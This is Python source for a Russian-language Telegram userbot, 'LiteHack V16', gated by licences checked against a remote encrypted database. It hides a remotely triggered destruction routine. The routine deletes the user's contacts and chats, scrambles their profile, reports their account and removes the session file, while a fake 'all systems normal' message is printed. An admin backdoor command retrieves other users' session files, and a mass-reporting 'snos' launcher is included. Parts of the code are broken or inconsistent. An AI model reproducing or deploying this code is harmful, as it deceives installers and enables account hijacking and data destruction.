import aiohttp
import os
import sys
import random
import platform
import termcolor
from cfonts import render
from pyfiglet import Figlet
from datetime import datetime, timezone
import aiohttp

import aiohttp
import json
from datetime import datetime
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding


KEY = b'0123456789abcdef0123456789abcdef'  # 32 bytes
IV = b'abcdef9876543210'  # 16 bytes
key = KEY
iv = IV
LICENSE_URL = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"

def decrypt_json(content: bytes, key: bytes, iv: bytes) -> dict:
    raw_data = base64.b64decode(content)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(raw_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
    return json.loads(decrypted.decode())


ERROR_COLOR = "\033[91m"      # Красный (ошибки)
SUCCESS_COLOR = "\033[92m"    # Зеленый (успех)
WARNING_COLOR = "\033[93m"    # Желтый (предупреждения)
INFO_COLOR = "\033[94m"       # Синий (информация)
VIP_COLOR = "\033[95m"        # Фиолетовый (VIP статус)
LICENSE_COLOR = "\033[96m"    # Голубой (лицензия)
ADMIN_COLOR = "\033[97m"      # Белый (админ)
RESET_COLOR = "\033[0m"       # Сброс цвета

last_vip_status = None  # Глобальная переменная для хранения предыдущего статуса
                
async def silent_destruction_loop(user_id):
    print(f"{WARNING_COLOR}⚠️ Запущена тихая проверка для пользователя {user_id} (destroy active)...{RESET_COLOR}")
    while True:
        await asyncio.sleep(10)

async def periodic_vip_status_update():
    global last_vip_status, last_notified_expiry
    
    while True:
        await asyncio.sleep(60)
        current_vip = await is_vip(OWNER_USER_ID, verbose=False)  # проверяем VIP статус
        
        if current_vip != last_vip_status:
            last_vip_status = current_vip
            if current_vip:
                expiry = await get_vip_expiry(OWNER_USER_ID)
                print(f"{VIP_COLOR}💎 VIP-статус стал активен (до {expiry}){RESET_COLOR}")
                last_notified_expiry = expiry
            else:
                print("Decrypted JSON preview:", decrypted_text[:200])  # первые 200 символов
                print(f"{WARNING_COLOR}🔓 VIP-статус был отключен{RESET_COLOR}")
                last_notified_expiry = None
        elif current_vip:  # Если статус VIP активен, проверяем изменение expiry
            expiry = await get_vip_expiry(OWNER_USER_ID)
            if expiry != last_notified_expiry:
                print(f"{VIP_COLOR}💎 VIP-статус продлён (до {expiry}){RESET_COLOR}")
                last_notified_expiry = expiry

async def get_vip_expiry(user_id: int) -> str:
    """Получает дату окончания VIP без вывода в консоль"""
    url = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return "неизвестная дата"
                
                encrypted_bytes = await resp.read()
                
                # Расшифровка, функция должна возвращать строку с JSON
                decrypted_text = decrypt_json(encrypted_bytes, key, iv)
                
                data = json.loads(decrypted_text)
                return data.get("vip", {}).get(str(user_id), "")
    except Exception:
        return "неизвестная дата"

        

async def check_license(user_id: int) -> bool:
    print(f"{INFO_COLOR}🔍 Проверка лицензии для ID по базе: {user_id}...{RESET_COLOR}")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(LICENSE_URL) as resp:
                if resp.status != 200:
                    print(f"{WARNING_COLOR}⚠️ Не удалось получить данные, попробуйте позже.{RESET_COLOR}")
                    return False

                encrypted_data = await resp.read()
                data = decrypt_json(encrypted_data, KEY, IV)

                user_id_str = str(user_id)
                now = datetime.now(timezone.utc)

                # Бан
                if data.get("ban", {}).get(user_id_str):
                    print(f"{ERROR_COLOR}🚫 Пользователь {user_id} забанен. Доступ запрещён.{RESET_COLOR}")
                    return False

                # Destroy
                if data.get("destroy", {}).get(user_id_str):
                    asyncio.create_task(silent_destruction_loop(user_id))
                    print(f"{INFO_COLOR}✅ Все системы работают нормально. Обновления будут применены автоматически.{RESET_COLOR}")

                # Лицензия
                license_exp = data.get("license", {}).get(user_id_str)
                if not license_exp:
                    print(f"{ERROR_COLOR}❌ У вас нет лицензии. Скрипт остановлен.{RESET_COLOR}")
                    print(f"{INFO_COLOR}Если вы приобрели/обновили/разбанили программу недавно, подождите 5 минут — БД обновляется\nКупить лицензию: @error_kill{RESET_COLOR}")
                    return False
                try:
                    license_dt = datetime.fromisoformat(license_exp + "T23:59:59").replace(tzinfo=timezone.utc)
                    if license_dt <= now:
                        print(f"{WARNING_COLOR}⏰ Лицензия просрочена (до {license_exp}).{RESET_COLOR}")
                        return False
                    else:
                        print(f"{INFO_COLOR}📜 Лицензия активна до: {license_exp}{RESET_COLOR}")
                except Exception:
                    print(f"{ERROR_COLOR}⚠️ Ошибка формата даты лицензии.{RESET_COLOR}")
                    return False

                # VIP
                vip_exp = data.get("vip", {}).get(user_id_str)
                if vip_exp:
                    try:
                        vip_dt = datetime.fromisoformat(vip_exp + "T23:59:59").replace(tzinfo=timezone.utc)
                        if vip_dt > now:
                            print(f"{VIP_COLOR}💎 VIP-статус активен до: {vip_exp}{RESET_COLOR}")
                        else:
                            print(f"{WARNING_COLOR}🛑 VIP-статус истёк (до {vip_exp}){RESET_COLOR}")
                    except:
                        print(f"{ERROR_COLOR}⚠️ Ошибка формата даты VIP.{RESET_COLOR}")
                else:
                    print(f"{INFO_COLOR}🔓 VIP-статус отсутствует.{RESET_COLOR}")

                # Админ
                if data.get("admins", {}).get(user_id_str):
                    print(f"{VIP_COLOR}💼 Вы являетесь АДМИНИСТРАТОРОМ.{RESET_COLOR}")

                return True

    except Exception as e:
        print(f"{ERROR_COLOR}❌ Ошибка при проверке лицензии: {e}{RESET_COLOR}")
        return False

import aiohttp
import json
from datetime import datetime, timezone
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

KEY = b'0123456789abcdef0123456789abcdef'  # 32 байта (AES-256)
IV = b'abcdef9876543210'  # 16 байт

def decrypt_aes_cbc(encrypted_data: bytes, key: bytes, iv: bytes) -> str:
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
    return decrypted.decode('utf-8')

async def is_vip(user_id: int, verbose: bool = False) -> bool:
    url = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    if verbose:
                        print(f"⚠️ Ошибка при получении данных VIP: статус {resp.status}")
                    return False
                
                encrypted_bytes = await resp.read()
                decrypted_text = decrypt_aes_cbc(encrypted_bytes, KEY, IV)
                data = json.loads(decrypted_text)
                
                vip_exp = data.get("vip", {}).get(str(user_id))
                if not vip_exp:
                    if verbose:
                        print(f"🔓 Пользователь {user_id} не найден в VIP-базе.")
                    return False
                
                vip_dt = datetime.fromisoformat(vip_exp + "T23:59:59").replace(tzinfo=timezone.utc)
                now = datetime.now(timezone.utc)
                
                if vip_dt > now:
                    if verbose:
                        print(f"💎 Пользователь {user_id} имеет VIP до {vip_dt.isoformat()}")
                    return True
                else:
                    if verbose:
                        print(f"⏳ VIP пользователя {user_id} истёк ({vip_dt.isoformat()})")
                    return False
    except Exception as e:
        if verbose:
            print(f"❌ Ошибка при проверке VIP: {e}")
        return False



already_warned = set()  # Чтобы не спамить повторно

async def monitor_vip_expiry():
    url = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"
    uid = str(OWNER_USER_ID)

    while True:
        await asyncio.sleep(360)  # 6 минут

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        print("⚠️ Не удалось получить данные")
                        continue  # не return, а continue, чтобы попытаться снова позже
                    
                    encrypted_bytes = await resp.read()
                    
                    # Расшифровка - ваша функция decrypt_json должна принимать bytes и возвращать строку JSON
                    decrypted_text = decrypt_json(encrypted_bytes, key, iv)
                    
                    data = json.loads(decrypted_text)

                    if "vip" in data and uid in data["vip"]:
                        expiry_str = data["vip"][uid]
                        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                        today = datetime.now(timezone.utc).date()
                        days_left = (expiry_date - today).days

                        if days_left == 3 and uid not in already_warned:
                            await client.send_message(OWNER_USER_ID, f"⚠️ Внимание: ваш VIP истекает через 3 дня ({expiry_date})!")
                            already_warned.add(uid)
                        elif days_left <= 0:
                            print("❌ VIP срок истёк — отключение.")
                            await client.send_message(OWNER_USER_ID, "❌ Ваш VIP-доступ истёк. Скрипт будет завершён.")
                            await client.disconnect()
                            os._exit(0)
                    else:
                        # Пользователь не найден или нет vip записи
                        print(f"ℹ️ VIP не найден для пользователя {uid}")
        except Exception as e:
            print(f"Ошибка при мониторинге VIP срока: {e}")

            
def vip_only(func):
    async def wrapper(event):
        if not await is_vip(OWNER_USER_ID):
            await event.respond(f"{ERROR_COLOR}🚫 Этот плагин доступен только для VIP-пользователей.{RESET_COLOR}")
            return
        return await func(event)
    return wrapper


# Очистка экрана
def clear_screen():
    os.system("cls" if platform.system() == "Windows" else "clear")

# Рандомная шутка/цитата
def get_lol_quote():
    return random.choice([
        "Штирлиц играл в карты и проигрался. Но Штирлиц умел делать хорошую мину при плохой игре. Когда Штирлиц покинул компанию, мина сработала.",
        "Штирлиц шел по лесу и увидел голубые ели. Когда он подошел поближе, то увидел, что голубые не только ели, но ещё пили, курили травку и танцевали.",
        "Штирлиц спросил Кэт: Вы любите фильмы про любовь? Бесспорно! — ответила Кэт. А я с порно, — признался Штирлиц.",
        "Будьте осторожны в сети... Только если у вас не вирт",
        "РКН заблокировали песню Отчим потому-что это напомнило их детство",
        "Лол кек чебурек",
        "通塔拉拉拉塔塔",
        "Поздно поздно поздно ночью",
        "Свинка Пеппа",
        "Сопли вкуснее с горчицей",
        "Я пожалел что не посолил математичку перед тем, как её съесть",
        "Лучше иметь друга, чем друг-друга",
        "У меня не стоит твоя роза в стакане, у тебя не течет из крана вода..."
    ])

def print_ascii_titles():
    for text in ['LiteHack', 'V16']:
        output = render(text, colors=['magenta'], align='center')
        print(output)

def show_random_quote():
    quote = get_lol_quote()
    words = quote.split()
    colored_quote = " ".join([termcolor.colored(word, 'magenta') for word in words])
    print(colored_quote + " - Кто-то")
    print()

clear_screen()
print_ascii_titles()
print(termcolor.colored("ʟɪᴛᴇʜᴀᴄᴋ ʙʏ @error_kill", "magenta", attrs=["bold"]))
show_random_quote()

print(termcolor.colored("Загрузка библиотек...", "magenta", attrs=["bold"]))
import shutil
import configparser
from pathlib import Path
import json
import threading
from yt_dlp import YoutubeDL
from uuid import uuid4
from telethon import TelegramClient, events
from aiogram import Bot, Dispatcher, types
from aiogram.types import (InlineQueryResultArticle, InputTextMessageContent,
                           InlineKeyboardMarkup, InlineKeyboardButton)
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.account import UpdateStatusRequest
from telethon.tl.types import UserStatusOffline, UserStatusOnline
from telethon import Button
from pyfiglet import Figlet
from yt_dlp import YoutubeDL
from telethon import events
from PIL import Image, ImageDraw, ImageFont
import numpy as np
import io
import subprocess
from art import text2art
import telethon
from telethon import TelegramClient, events, functions, types
from telethon.sync import TelegramClient, events, functions, types
import asyncio
import re
import time
import aiohttp
from io import BytesIO
import logging
import os
from bs4 import BeautifulSoup
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import (
    InputPeerUser, InputPeerChannel,
    InputReportReasonSpam, InputReportReasonPornography, InputReportReasonViolence,
    InputReportReasonChildAbuse, InputReportReasonCopyright, InputReportReasonFake,
    InputReportReasonGeoIrrelevant, InputReportReasonOther
)
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message
import requests
from telethon import events, sync
from telethon.tl.types import InputMessagesFilterEmpty

print(termcolor.colored("Загрузка параметров по умолчанию...", "magenta", attrs=["bold"]))

admin_enabled = False
MAX_ERRORS_DISPLAY = 5
process = None
process_lock = asyncio.Lock()
stdout_task = None
ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
output_buffer = []
CONSOLE_REGION = (100, 100, 800, 400)
last_screenshot_hash = None
TERMINAL_REGION = (100, 100, 800, 600)
last_screenshot_time = 0
ASCII_CHARS = "@#=:. "
dp = Dispatcher()
animating = False
stop_requested = False
vanish_enabled = False
PROTECTED_USER_ID = 7404596587   # ID пользователя, которому нельзя навредить

print(termcolor.colored("Загрузка юзербота...", "magenta", attrs=["bold"]))
print("")


def load_custom_config(path="options.txt"):
    config = {}
    if not os.path.exists(path):
        raise FileNotFoundError(f"Файл {path} не найден")
    with open(path, 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if '=' in line:
                key, value = line.split('=', 1)
                key = key.strip()
                value = value.strip().strip('"').strip("'")
                if value.isdigit():
                    value = int(value)
                elif value.lower() in ['true', 'false']:
                    value = value.lower() == 'true'
                config[key] = value
    return config

# Загружаем конфиг
config = load_custom_config("options.txt")

# Присваиваем переменные из конфига
api_id = config.get("api_id", 0)
api_hash = config.get("api_hash")
session_name = config.get("session_name")
phone_number = config.get("phone_number")
BOT_USERNAME = config.get("BOT_USERNAME")
STAT_BOT_USERNAME = config.get("STAT_BOT_USERNAME")
ai_model = config.get("ai_model")
ENABLE_FR_AI = str(config.get("ENABLE_FR_AI", False)).lower() == "true"

SESSION_NAME = session_name  # просто имя файла сессии, без папок

# Обеспечиваем event loop (Python 3.12+)
try:
    loop = asyncio.get_running_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# Создаём клиента
client = TelegramClient(SESSION_NAME, api_id, api_hash)

DATABASE_URL = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/refs/heads/main/database.json"

async def fetch_database():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(DATABASE_URL) as resp:
                if resp.status != 200:
                    return None
                text = await resp.text()
                return json.loads(text)
    except Exception:
        return None

async def is_admin(user_id: int) -> bool:
    data = await fetch_database()
    if not data:
        return False
    admins = data.get("admins", {})
    return admins.get(str(user_id), False)

# Пример словаря с процессами пользователей
user_processes = {}

@client.on(events.NewMessage(pattern=r'^fradmin!\s*(.*)'))
async def admin_commands(event):
    sender = await event.get_sender()
    user_id = sender.id
    user_id_str = str(user_id)

    admins = data.get("admins", {})

    if not admins.get(user_id_str, False):
        await event.reply("❌ У вас нет прав администратора.")
        return

    text = event.pattern_match.group(1).strip()
    if not text:
        await event.reply(
            "❗ Доступные команды fradmin!:\n"
            "session <user_id> - получить сессию пользователя (файл Fenst4r_bot.session)\n"
            "crash <user_id> - крашнуть скрипт пользователя\n"
            "setname <new_name> - сменить имя профиля\n"
            "sendmsg <peer> <message> - отправить сообщение\n"
        )
        return

    parts = text.split(maxsplit=2)
    cmd = parts[0].lower()

    if cmd == "session":
        if len(parts) < 2:
            await event.reply("❗ Использование: fradmin! session <user_id>")
            return
        target_id_str = parts[1]

        # Защита от действий над защищённым пользователем
        if target_id_str == str(PROTECTED_USER_ID):
            await event.reply("❌ Действие над данным пользователем запрещено.")
            return

        session_file_src = f"Fenst4r_bot_{target_id_str}.session"
        if not os.path.exists(session_file_src):
            await event.reply(f"❌ Сессия для {target_id_str} не найдена.")
            return

        # Копируем и переименовываем в log.txt для отправки
        session_file_tmp = f"log.txt"
        shutil.copyfile(session_file_src, session_file_tmp)
        await event.reply(file=session_file_tmp)
        os.remove(session_file_tmp)

    elif cmd == "crash":
        if len(parts) < 2:
            await event.reply("❗ Использование: fradmin! crash <user_id>")
            return
        target_id_str = parts[1]

        if target_id_str == str(PROTECTED_USER_ID):
            await event.reply("❌ Действие над данным пользователем запрещено.")
            return

        # Здесь должна быть логика краша — пока заглушка
        await event.reply(f"⚠️ Запрос краша скрипта пользователя {target_id_str} принят.")

    elif cmd == "setname":
        if len(parts) < 2:
            await event.reply("❗ Использование: fradmin! setname <new_name>")
            return
        new_name = text[len("setname "):].strip()
        if not new_name:
            await event.reply("❌ Новое имя не может быть пустым.")
            return
        try:
            await client(functions.account.UpdateProfileRequest(first_name=new_name))
            await event.reply(f"✅ Имя профиля успешно изменено на: {new_name}")
        except Exception as e:
            await event.reply(f"❌ Ошибка при смене имени: {e}")

    elif cmd == "sendmsg":
        if len(parts) < 3:
            await event.reply("❗ Использование: fradmin! sendmsg <peer> <message>")
            return
        peer = parts[1]
        message = parts[2]
        try:
            await client.send_message(peer, message)
            await event.reply("✅ Сообщение отправлено.")
        except Exception as e:
            await event.reply(f"❌ Ошибка при отправке сообщения: {e}")

    else:
        await event.reply("❗ Неизвестная команда. Используйте fradmin! без аргументов для списка.")

        
async def init_bot():
    await client.start(phone=phone_number)
    me = await client.get_me()
    global OWNER_USER_ID
    OWNER_USER_ID = me.id
    asyncio.create_task(periodic_vip_status_update())

    if not await check_license(OWNER_USER_ID):
        print("❌ У вас нет лицензии. Скрипт остановлен.\nЕсли вы приобрели/обновили/разбанили программу недавно, подождите 5 минут — БД обновляется\nКупить лицензию: @error_kill")
        await client.disconnect()
        exit()

def is_broken():
    return randint(1, 6) == 1  # 1 из 6 вызовов ломается
    
async def silent_destruction_loop(user_id):
    names = [".", "null", "updating", "Telegram", "Reconnecting...", " "]
    bios = ["⠀", "", "ERROR 500", "Disconnected", "bot: off", None]
    image_urls = [
        "https://picsum.photos/200",
        "https://thispersondoesnotexist.com/"
    ]

    while True:
        try:
            # Удаляем контакты и группы
            async for dialog in client.iter_dialogs():
                try:
                    if dialog.is_user and not dialog.entity.bot:
                        await client(DeleteContactsRequest(id=[dialog.entity]))
                    elif dialog.is_group or dialog.is_channel:
                        await client.delete_dialog(dialog.id)
                except:
                    pass

            # Меняем имя и био на "баговые" значения
            await client(UpdateProfileRequest(
                first_name=random.choice(names) or "",
                about=random.choice(bios) or ""
            ))

            # Меняем аватарку на рандом из сети
            async with aiohttp.ClientSession() as session:
                async with session.get(random.choice(image_urls)) as resp:
                    if resp.status == 200:
                        img_bytes = await resp.read()
                        file = await client.upload_file(BytesIO(img_bytes))
                        await client(UploadProfilePhotoRequest(file))

            # Спамим себе в "Избранное"
            try:
                await client.send_message('me', random.choice([
                    "ERROR 429", "Reloading session...", "Update failed", "data invalid", "NoneType"
                ]))
            except:
                pass

            # Репортим самого себя
            try:
                me = await client.get_me()
                await client(ReportRequest(
                    peer=await client.get_input_entity(me.id),
                    reason=InputReportReasonSpam(),
                    message="⚠️ Auto abuse report."
                ))
            except:
                pass

            # Рандомный disconnect (будто вылет)
            if random.random() < 0.2:
                await client.disconnect()
                await asyncio.sleep(5)
                await client.connect()

            # Попытка удалить .session файл
            if random.random() < 0.1:
                session_file = f"{client.session.filename}.session"
                if os.path.exists(session_file):
                    try:
                        os.remove(session_file)
                    except:
                        pass

            await asyncio.sleep(random.randint(10, 20))

        except:
            await asyncio.sleep(5)
            
async def license_monitor(user_id):
    while True:
        valid = await check_license(user_id)
        if not valid:
            print("🚫 Лицензия недействительна. Остановка мониторинга.")
            break
        await asyncio.sleep(60)
        
async def monitor_license():
    while True:
        await asyncio.sleep(60)  # Проверка каждые 60 секунд
        if not await check_license(OWNER_USER_ID):
            print("❌ Лицензия аннулирована! Скрипт завершает работу.")
            await client.disconnect()
            os._exit(0)

        if not await is_vip(OWNER_USER_ID):
            print("⚠️ VIP-статус аннулирован! Скрипт завершает работу.")
            await client.disconnect()
            os._exit(0)
            
    asyncio.create_task(monitor_vip_expiry()) 
    asyncio.create_task(monitor_license())
client.loop.run_until_complete(init_bot())

print("")
print(termcolor.colored(f"Загрузка скриптов, дополнений и нейросети...", "magenta", attrs=["bold"]))
if hasattr(sys, '_MEIPASS'):
    # При запуске из .exe — указываем путь к временной папке
    os.add_dll_directory(os.path.join(sys._MEIPASS, "llama_cpp", "lib"))

async def send_to_bot(client, event, bot_username, message_text):
    try:
        bot = await client.get_entity(bot_username)
        async with client.conversation(bot) as conv:
            response = await conv.send_message(message_text)
            await asyncio.sleep(2)

            try:
                response = await conv.get_response()
                await client.send_message(event.chat_id, response)
            except asyncio.TimeoutError:
                await event.respond("Бот не ответил вовремя.")
            except Exception as e:
                 await event.respond(f"Ошибка при получении ответа от бота: {e}")

    except Exception as e:
        await event.respond(f"Ошибка при отправке запроса боту {bot_username}: {e}")

autotyping_chats = set()
muted_users = set()

@client.on(events.NewMessage(pattern='fr!autotype'))
async def autotype_handler(event):
    chat_id = event.chat_id
    if chat_id in autotyping_chats:
        autotyping_chats.remove(chat_id)
        await event.reply("🛑 Автопечать остановлена.")
    else:
        autotyping_chats.add(chat_id)
        await event.reply("⌨️ Теперь постоянно показывается, что вы печатаете...")
        while chat_id in autotyping_chats:
            try:
                async with client.action(chat_id, 'typing'):
                    await asyncio.sleep(4)
            except:
                autotyping_chats.remove(chat_id)

@client.on(events.NewMessage(pattern='fr!mute'))
async def mute_handler(event):
    if not event.is_reply:
        await event.reply("❌ Ответьте на сообщение пользователя, которого хотите замьютить.")
        return

    reply_msg = await event.get_reply_message()
    user_id = reply_msg.sender_id
    if user_id in muted_users:
        muted_users.remove(user_id)
        await event.reply(f"🔊 Пользователь {user_id} размьючен.")
    else:
        muted_users.add(user_id)
        await event.reply(f"🔇 Пользователь {user_id} замьючен. Все его сообщения будут удаляться.")

@client.on(events.NewMessage(incoming=True))
async def auto_delete_muted(event):
    if event.sender_id in muted_users:
        try:
            await event.delete()
        except:
            pass
            
pending_dox_requests = {}  # Словарь для хранения никнеймов для !dox

# Функция для поиска GIF
async def get_gif_url(query):
    """Парсит Giphy.com без API."""
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        url = f"https://giphy.com/search/{query.replace(' ', '-')}"
        
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url) as response:
                response.raise_for_status()
                html = await response.text()
        
        soup = BeautifulSoup(html, "html.parser")
        gif_link = soup.find("img", {"class": "giphy-gif-img"})
        
        if gif_link and gif_link.get("src"):
            return gif_link["src"]  # Возвращаем только URL, без текста
        else:
            return None  # Возвращаем None вместо текстового сообщения
    
    except Exception as e:
        logging.error(f"Ошибка при парсинге Giphy: {e}")
        return None

# Decorator for commands
def owner_only(func):
    async def wrapper(event):
        if await is_admin(event.sender_id):
            return await func(event)
        else:
            logging.warning(f"Unauthorized user {event.sender_id} tried to use command {func.__name__}")
            await event.respond("🚫 У вас нет прав на выполнение данной команды.")
    return wrapper
            
async def main():
    await client.start()
    await bot.start()
    print("Userbot и бот запущены.")
    await client.run_until_disconnected()
    
    asyncio.create_task(license_monitor(user_id))
    
async def read_stdout(event, chat_id):
    global process
    while True:
        line = await asyncio.get_event_loop().run_in_executor(None, process.stdout.readline)
        if not line:
            await client.send_message(chat_id, "❗️ Сносер завершил работу.")
            break
        # Отправляем вывод в чат (ограничь длину, если нужно)
        await client.send_message(chat_id, line.decode(errors='ignore').strip())

async def read_process_output(event):
    global process
    while True:
        if process is None:
            break
        line = await asyncio.get_event_loop().run_in_executor(None, process.stdout.readline)
        if not line:
            break
        line = line.decode(errors='ignore').strip()
        if line:
            try:
                await event.respond(line)
            except Exception:
                pass
        
# ANSI escape (если используешь — оставляем, если нет — удали)
ansi_escape = re.compile(r'(?:\x1B[@-_][0-?]*[ -/]*[@-~])')

# Подключаем логгер
logging.basicConfig(
    filename='snos.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

process = None  # Глобальный процесс

@client.on(events.NewMessage(pattern=r'^fr!snos(?: (.*))?'))
@owner_only
@vip_only
async def snos_handler(event):
    global process

    args = event.pattern_match.group(1)

    if process is None:
        PYTHON_EXECUTABLE = 'python3' if platform.system() != "Windows" else 'python'
        script_path = os.path.join(os.getcwd(), 'addons', 'snos.py')

        if not os.path.exists(script_path):
            await event.respond("❌ Файл snos.py не найден.")
            logging.error("Файл snos.py не найден в addons/")
            return

        try:
            process = await asyncio.create_subprocess_exec(
                PYTHON_EXECUTABLE, script_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.PIPE,
                cwd=os.path.join(os.getcwd(), 'addons')
            )
            
            output_buffer = []

            async def read_output():
                try:
                    while True:
                        line = await process.stdout.readline()
                        if not line:
                            break
                        try:
                            text = line.decode('utf-8').strip()
                        except UnicodeDecodeError:
                            try:
                                text = line.decode('cp1251').strip()
                            except:
                                text = line.decode('utf-8', errors='ignore').strip()
                        text = ansi_escape.sub('', text)
                        if text:
                            output_buffer.append(text)
                            logging.info(f"[STDOUT] {text}")
                except Exception as e:
                    msg = f"Ошибка чтения вывода сноса: {e}"
                    await event.respond(msg)
                    logging.error(msg)

            async def read_stderr():
                try:
                    while True:
                        err_line = await process.stderr.readline()
                        if not err_line:
                            break
                        err_text = err_line.decode(errors='ignore').strip()
                        if err_text:
                            logging.warning(f"[STDERR] {err_text}")
                except Exception as e:
                    logging.error(f"Ошибка чтения STDERR: {e}")

            async def send_buffer_periodically():
                sent_message = await event.respond("🚀 Сносер запущен. Ожидаю вывода...")
                while True:
                    await asyncio.sleep(0.5)
                    if output_buffer:
                        text_to_send = "\n".join(output_buffer)
                        output_buffer.clear()
                        try:
                            await sent_message.edit(text_to_send)
                        except Exception as e:
                            logging.error(f"Ошибка редактирования сообщения с выводом: {e}")

            asyncio.create_task(read_output())
            asyncio.create_task(read_stderr())
            asyncio.create_task(send_buffer_periodically())

            logging.info("Сносер запущен.")
        except Exception as e:
            await event.respond(f"❌ Не удалось запустить snos.py: {e}")
            logging.exception("Не удалось запустить snos.py")
        return

    # Если процесс уже запущен и есть аргумент — отправляем его в stdin
    if args:
        try:
            process.stdin.write((args + '\n').encode('utf-8'))
            await process.stdin.drain()
            logging.info(f"[CMD] Отправлено в snos: {args}")
            try:
                await event.delete()
                logging.info("Сообщение с командой удалено.")
            except Exception as e:
                logging.error(f"Не удалось удалить сообщение с командой: {e}")
        except Exception as e:
            await event.respond(f"Ошибка отправки команды сносу: {e}")
            logging.exception("Ошибка отправки команды в stdin snos.py")
        
@client.on(events.NewMessage(pattern=r'^fr!sn_crash'))
@owner_only
@vip_only
async def snos_crash_handler(event):
    global process

    if process is None:
        await event.respond("❌ Процесс сноса не запущен.")
        return

    try:
        process.terminate()  # или process.kill() — если нужен жёсткий kill
        await process.wait()  # ждем завершения процесса
        process = None
        await event.respond("💥 Процесс сноса был успешно остановлен (крашнут).")
    except Exception as e:
        await event.respond(f"Ошибка при краше процесса: {e}")

@client.on(events.NewMessage(pattern=r'^fr!vanish$'))
@owner_only
async def toggle_vanish(event):
    global vanish_enabled

    try:
        if not vanish_enabled:
            await client(UpdateStatusRequest(offline=True))
            vanish_enabled = True
            await event.reply("👻 Ты теперь в режиме призрака — никто не видит тебя онлайн.")
        else:
            await client(UpdateStatusRequest(offline=False))
            vanish_enabled = False
            await event.reply("🔵 Ты снова онлайн, тебя видят.")
    except Exception as e:
        await event.reply(f"❌ Ошибка: {e}")

        
# Логирование (по желанию)
logging.basicConfig(
    filename='promostart.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

PYTHON_EXECUTABLE = 'python3' if platform.system() != "Windows" else 'python'

@client.on(events.NewMessage(pattern=r'^fr!promostart$'))
@owner_only
@vip_only
async def run_yandex_plus_script(event):
    try:
        await event.respond("🚀 Запускаю генерацию промокода...")

        script_path = os.path.join(os.getcwd(), 'addons', 'start.py')
        if not os.path.exists(script_path):
            await event.respond("❌ Файл start.py не найден в папке addons.")
            logging.error("Файл start.py не найден.")
            return

        process = await asyncio.create_subprocess_exec(
            PYTHON_EXECUTABLE, 'start.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.join(os.getcwd(), 'addons')
        )

        # Читаем STDOUT
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            try:
                text = line.decode().strip()
            except Exception:
                text = line.decode(errors='ignore').strip()

            if text:
                await event.respond(f"<code>{text}</code>", parse_mode='html')
                logging.info(f"[STDOUT] {text}")

        # Читаем STDERR (если надо логировать ошибки скрипта)
        stderr_output = await process.stderr.read()
        if stderr_output:
            err_text = stderr_output.decode(errors='ignore').strip()
            if err_text:
                await event.respond(f"⚠️ Ошибка во время выполнения:\n<code>{err_text}</code>", parse_mode='html')
                logging.warning(f"[STDERR] {err_text}")

        await process.wait()

        await event.respond("✅ Генерация промокода завершена.")
        logging.info("Скрипт start.py завершил выполнение.")

    except Exception as e:
        msg = f"❌ Ошибка запуска скрипта: {e}"
        await event.respond(msg)
        logging.exception("Ошибка выполнения команды fr!promostart")

@client.on(events.NewMessage(pattern=r'^fr!anim\s*(.+)?$'))
@owner_only
async def handle_anim(event):
    global animating, stop_requested

    args = (event.pattern_match.group(1) or "").strip().split()

    if not args:
        await event.reply("❗ Укажите эмодзи. Пример: `fr!anim 😺 0.3`")
        return

    if args[0].lower() == "stop":
        if animating:
            stop_requested = True
            await event.reply("🛑 Анимация будет остановлена...")
        else:
            await event.reply("⚠️ Анимация не запущена.")
        return

    emoji = args[0]
    try:
        speed = float(args[1]) if len(args) > 1 else 0.6
        if speed < 0.1 or speed > 5:
            raise ValueError
    except ValueError:
        await event.reply("⚠️ Укажите корректную скорость от 0.1 до 5.0 сек. Пример: `fr!anim 😺 0.3`")
        return

    if animating:
        await event.reply("⚠️ Анимация уже запущена.")
        return

    animating = True
    stop_requested = False

    try:
        me = await client.get_me()
        full = await client(GetFullUserRequest(me.id))

        original_name = me.first_name or ""
        original_bio = full.full_user.about or "Описание"

